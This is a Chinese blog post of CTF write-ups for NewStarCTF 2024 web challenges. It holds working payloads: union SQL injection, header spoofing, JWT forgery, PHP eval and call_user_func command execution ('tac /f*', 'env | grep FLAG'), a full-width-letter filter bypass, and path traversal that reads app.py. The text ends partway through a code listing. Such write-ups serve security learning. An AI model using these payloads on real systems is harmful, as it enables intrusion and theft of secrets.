<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>newstarCTF2024-web | tgrddf55's Blog</title><meta name="author" content="tgrddf55"><meta name="copyright" content="tgrddf55"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="链接newstarCTF 2024 谢谢皮蛋由于页面只能显示1条信息，因此一开始的id要设置为-1，这样就不会在原始数据库查询了（查不到了） 之后就是正常的利用union来查库名 表名 列名即可 PangBai 过家家（1）学到了不少东西 一开始用的hackbar发包，到第五关卡住了，于是改用了burpsuite发包 从get改到post方法漏东西了，导致一直发不成功了 POST 的查询类型有很多">
<meta property="og:type" content="article">
<meta property="og:title" content="newstarCTF2024-web">
<meta property="og:url" content="http://example.com/2025/06/08/2025-06-14-newstarCTF-web/index.html">
<meta property="og:site_name" content="tgrddf55&#39;s Blog">
<meta property="og:description" content="链接newstarCTF 2024 谢谢皮蛋由于页面只能显示1条信息，因此一开始的id要设置为-1，这样就不会在原始数据库查询了（查不到了） 之后就是正常的利用union来查库名 表名 列名即可 PangBai 过家家（1）学到了不少东西 一开始用的hackbar发包，到第五关卡住了，于是改用了burpsuite发包 从get改到post方法漏东西了，导致一直发不成功了 POST 的查询类型有很多">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/35.jpg">
<meta property="article:published_time" content="2025-06-07T16:00:00.000Z">
<meta property="article:modified_time" content="2025-06-07T16:00:00.000Z">
<meta property="article:author" content="tgrddf55">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/35.jpg"><link rel="shortcut icon" href="/imgs/tgrddf55.jpg"><link rel="canonical" href="http://example.com/2025/06/08/2025-06-14-newstarCTF-web/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'newstarCTF2024-web',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-08 00:00:00'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/tgrddf55.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/35.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="tgrddf55's Blog"><span class="site-name">tgrddf55's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">newstarCTF2024-web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-07T16:00:00.000Z" title="发表于 2025-06-08 00:00:00">2025-06-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-07T16:00:00.000Z" title="更新于 2025-06-08 00:00:00">2025-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="newstarCTF2024-web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14">newstarCTF 2024</a></p>
<h1 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h1><p>由于页面只能显示1条信息，因此一开始的id要设置为-1，这样就不会在原始数据库查询了（查不到了）</p>
<p>之后就是正常的利用union来查库名 表名 列名即可</p>
<h1 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a><strong>PangBai 过家家（1）</strong></h1><p>学到了不少东西</p>
<p>一开始用的hackbar发包，到第五关卡住了，于是改用了burpsuite发包</p>
<p>从get改到post方法漏东西了，导致一直发不成功了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST 的查询类型有很多种，通过 HTTP 报文中的 Content-Type 指定，以告诉服务端用何种方式解析报文 Body 的内容。</span><br><span class="line"></span><br><span class="line">Content-Type	描述</span><br><span class="line">application/x-www-form-urlencoded	和 GET 查询字段的写法一样，开头不需要 ?，用 &amp; 符号连接各查询参数，遇到特殊字符需要进行转义。</span><br><span class="line">application/json	Body 给出一个 JSON 格式的数据，服务端会解析它。</span><br><span class="line">multipart/form-data	表单字段，一般用于有文件等复杂类型的场景。</span><br><span class="line">我们可以用任意方式，那么我们选择用 application/x-www-form-urlencoded 发送个 say=hello 的请求包即可。</span><br></pre></td></tr></table></figure>

<p>在发包报文那里任意位置添加项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>即可</p>
<p>另外还有个事情</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果使用 HackBar 插件，请在 Modify Header 一栏中删除 Cookie 字段（删除后会自动采用浏览器当前的 Cookie），或者请手动更新该字段。因为 Cookie 携带着关卡信息，如果不更新该值，将永远停留在同一关。</span><br></pre></td></tr></table></figure>

<p>第5关要求用patch方法发一个包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一关是相对较难的一关，浏览器插件并不支持发送 PATCH 包和自定义文件，必须通过一些发包工具或者写代码来发送该内容。PATCH 包的格式与 POST 无异，使用 Content-Type: multipart/form-data 发包即可，注意该 Header 的值后面需要加一个 boundary 表示界定符。例如Content-Type: multipart/form-data; boundary=abc，那么在 Body 中，以 --abc 表示一个查询字段的开始，当所有查询字段结束后，用 --abc-- 表示结束。</span><br></pre></td></tr></table></figure>

<p>关于 multipart&#x2F;form-data</p>
<p>这个 Content-Type 下的 Body 字段不需要进行转义，每一个查询内容以一个空行区分元信息和数据（就和 HTTP 报文区分标头和 Body 的那样），如果数据中包含 <code>boundary</code> 界定符的相关内容，可能引起误解，那么可以通过修改 <code>boundary</code> 以规避碰撞情况（因此浏览器发送 <code>mulipart/form-data</code> 的表单时，<code>boundary</code> 往往有很长的 <code>--</code> 并且包含一些长的随机字符串。</p>
<p>发包内容</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PATCH</span> <span class="string">/?ask=miao</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.147.132.32:36002</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Papa/1.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=abc</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.xKi0JkzaQ0wwYyC3ebBpjuypRYvrYFICU5LSRLnWq_0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>168</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--abc</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.zip&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">123</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--abc</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;say&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">玛卡巴卡阿卡哇卡米卡玛卡呣</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--abc--</span></span></span><br></pre></td></tr></table></figure>

<p>其中”123”正是1.zip的内容</p>
<p>第6关要求让服务器认为这是一个来自本地的请求。</p>
<p>可以通过设置 <code>Host</code> <code>X-Real-IP</code> <code>X-Forwarded-For</code> <code>Referer</code> 等标头欺骗服务器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Referer: http://localhost</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: 8.147.132.32:36002</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: 8.147.132.32:36002</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br></pre></td></tr></table></figure>

<p>之后就是JWT</p>
<p>JWT 全称是 <strong>JSON Web Token</strong>，是一种基于 JSON 的开放标准（RFC 7519），用于在网络应用环境间以<strong>紧凑</strong>、<strong>URL 安全</strong>的方式传递信息，常用于**身份验证（Authentication）**和**授权（Authorization）**。</p>
<p>JWT 通常由三部分组成，用 <code>.</code> 分隔：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header.payload.signature</span><br></pre></td></tr></table></figure>

<p>第一个部分和第二部分都是base64编码的结果，第三部分是通过一个密钥外加前面的内容签名生成的，因此要伪造jwt必须要知道密钥</p>
<p>最后一关告诉了我们密钥，之后我们在payload里面改level为0即可。</p>
<h1 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h1><p>dirsearch扫目录，扫到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>下载下来打开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//for fun</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">//欸 为啥sha1和md5相等呢</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;u can not do this &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以让new 和star都是数组，这样sha1和md5返回都是null也就相等了。</p>
<p>preg_match(“&#x2F;cat|flag&#x2F;i”, $cmd)意思是不能出现cat和flag</p>
<p>可以 </p>
<figure class="highlight plaintext"><figcaption><span>/fla*``` 这个样子</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hackbar的payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:9859/pizwww.php?new%5B%5D=1">http://127.0.0.1:9859/pizwww.php?new[]=1</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>star[]&#x3D;2&amp;&amp;cmd&#x3D;system(“tac &#x2F;f*”);</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># Pangbai 过家家（2）</span><br><span class="line"></span><br><span class="line">.git泄露</span><br><span class="line"></span><br><span class="line">一开始用dirsearch扫，扫到.git了，网上找如何git泄漏，一开始用的githack结果发现怎么都用不了。</span><br><span class="line"></span><br><span class="line">wp用的是githacker</span><br><span class="line"></span><br><span class="line">```sh</span><br><span class="line">pip install githacker</span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githacker -url http://127.0.0.1:16475/.git/ --output-folder .</span><br></pre></td></tr></table></figure>

<p>就可以把源码泄漏出来了</p>
<p>可以查看stash</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git stash list</span><br></pre></td></tr></table></figure>

<p>查看到了backdoor</p>
<p>之后可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure>

<p>这里就能找到保存的未被提交的后门文件</p>
<p>查看源码，之后经过一系列的绕过</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:16475/BacKd0or.vubjeVv3GZwDWHK3.php/?NewStar[CTF.2024=Welcome%0a</span><br><span class="line"></span><br><span class="line">args=env | grep FLAG&amp;func=system&amp;papa=doKcdnEOANVB</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;papa&#x27;</span>] !== <span class="string">&#x27;doKcdnEOANVB&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_backdoor</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_msg</span>(<span class="string">&#x27;PangBai loves you!&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;func&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;args&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_msg</span>(<span class="string">&#x27;PangBai hates you!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于这个表达式，可以使用换行符绕过。preg_match 默认为单行模式（此时 . 会匹配换行符），但在 PHP 中的该模式下，$ 除了匹配整个字符串的结尾，还能够匹配字符串最后一个换行符。</span><br><span class="line">但如果直接传参 NewStar_CTF.2024=Welcome%0A 会发现并没有用。这是由 NewStar_CTF.2024 中的特殊字符 . 引起的，PHP 默认会将其解析为 NewStar_CTF_2024. 在 PHP 7 中，可以使用 [ 字符的非正确替换漏洞。当传入的参数名中出现 [ 且之后没有 ] 时，PHP 会将 [ 替换为 _，但此之后就不会继续替换后面的特殊字符了因此，GET 传参 NewStar[CTF.2024=Welcome%0a 即可，随后传入 call_user_func 的参数即可。</span><br></pre></td></tr></table></figure>

<p>一个是使用[替换_ 之后.就可以正常使用，一个是php里面$可以匹配换行符%0a</p>
<h1 id="臭皮的计算机"><a href="#臭皮的计算机" class="headerlink" title="臭皮的计算机"></a>臭皮的计算机</h1><p>有个waf函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    token = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:</span><br><span class="line">            token = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br></pre></td></tr></table></figure>

<p>不能输入英文</p>
<p>但是可以使用全角英文</p>
<p>方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(<span class="number">111</span>)+ｃｈｒ(<span class="number">115</span>)).ｓｙｓｔｅｍ(ｃｈｒ(<span class="number">99</span>)+ｃｈｒ(<span class="number">97</span>)+ｃｈｒ(<span class="number">116</span>)+ｃｈｒ(<span class="number">32</span>)+ｃｈｒ(<span class="number">47</span>)+ｃｈｒ(<span class="number">102</span>)+ｃｈｒ(<span class="number">108</span>)+ｃｈｒ(<span class="number">97</span>)+ｃｈｒ(<span class="number">103</span>))</span><br></pre></td></tr></table></figure>

<p>其中所有英文字母都是全角英文，除英文字母外使用半角字符和数字（import两边可以都是半角，可以一半一全，但不可以都是全角）</p>
<p>最终效果就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(os).system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="这照片是你吗"><a href="#这照片是你吗" class="headerlink" title="这照片是你吗"></a>这照片是你吗</h1><p>提示说</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 图标能够正常显示耶! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有apache和nginx，提示的意思是<br><strong>路由的处理方式很可能是统一由某个服务框架（如 Express、Flask、FastAPI、Django 等）处理的，而不是交给专门的 web 服务器分发静态资源</strong>；</p>
<p>可能存在路径穿越漏洞和任意文件读取。</p>
<p>可以使用..&#x2F;进行测试，但是不要使用浏览器测试，可以使用burpsuite。</p>
<blockquote>
<p>浏览器会根据 URL 规范自动对路径做调整，包括：</p>
<p>解析和简化路径中的 .（当前目录）和 ..（上级目录）部分。</p>
<p>去除多余的斜杠 &#x2F;。</p>
<p>防止访问父目录导致跨越网站根目录（路径穿越）。</p>
</blockquote>
<p>使用burpsuite发包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/../app.py</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:32655</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not.A/Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;136&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>

<p>可以得到app.py源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, render_template_string, request, redirect, send_file</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br><span class="line"></span><br><span class="line">base_key = <span class="built_in">str</span>(uuid.uuid4()).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">secret_key = get_random_number_string(<span class="number">6</span>)</span><br><span class="line">admin_pass = <span class="string">&quot;&quot;</span>.join([ _ <span class="keyword">for</span> _ <span class="keyword">in</span> base_key])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(admin_pass)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">failure_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: admin_pass,</span><br><span class="line">    <span class="string">&#x27;amiya&#x27;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> failure_count</span><br><span class="line">        <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            failure_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span 